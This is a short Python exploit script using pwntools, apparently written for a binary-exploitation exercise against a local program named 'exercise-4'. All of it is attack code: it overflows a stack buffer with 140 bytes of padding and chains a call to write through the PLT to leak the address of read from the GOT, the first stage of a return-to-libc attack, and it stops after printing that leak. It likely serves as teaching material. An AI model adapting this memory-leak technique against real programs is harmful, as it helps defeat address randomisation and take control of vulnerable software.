from pwn import *

# Load Context, binary, libc
context.binary = "./exercise-4"
binary = ELF("exercise-4")
libc = ELF("libc.so.6")

# plt, got, functions
write_plt = p32(binary.symbols["write"])
read_GOT = p32(binary.symbols["got.read"])

#r = process("./exercise-4")
r = gdb.debug("./exercise-4", "break main")
print r.recvline()


# Memory leak Section
###############################################################################
exploit = "A"*140

exploit += write_plt
exploit += "JUNK"
exploit += p32(0x1)
exploit += read_GOT
exploit += p32(0x4)

r.sendline(exploit)
print "0x%x" % int(r.recv(4)[::-1].encode("hex"),16)



